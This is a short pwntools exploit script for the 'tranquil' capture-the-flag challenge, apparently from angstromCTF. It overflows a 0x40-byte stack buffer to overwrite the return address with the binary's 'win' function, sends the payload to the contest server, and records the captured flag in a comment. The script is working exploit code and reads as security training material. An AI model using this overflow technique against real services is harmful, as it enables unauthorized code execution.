from pwn import *


binpath = './tranquil'
elf = ELF(binpath)
context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']

gdbscript = '''
b main
gef
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('shell.actf.co', 21830)

payload = b''
payload += b'A' * (0x40 + 8)
payload += p64(elf.symbols['win'])
io.sendlineafter(b'word', payload)

io.interactive()

# actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}
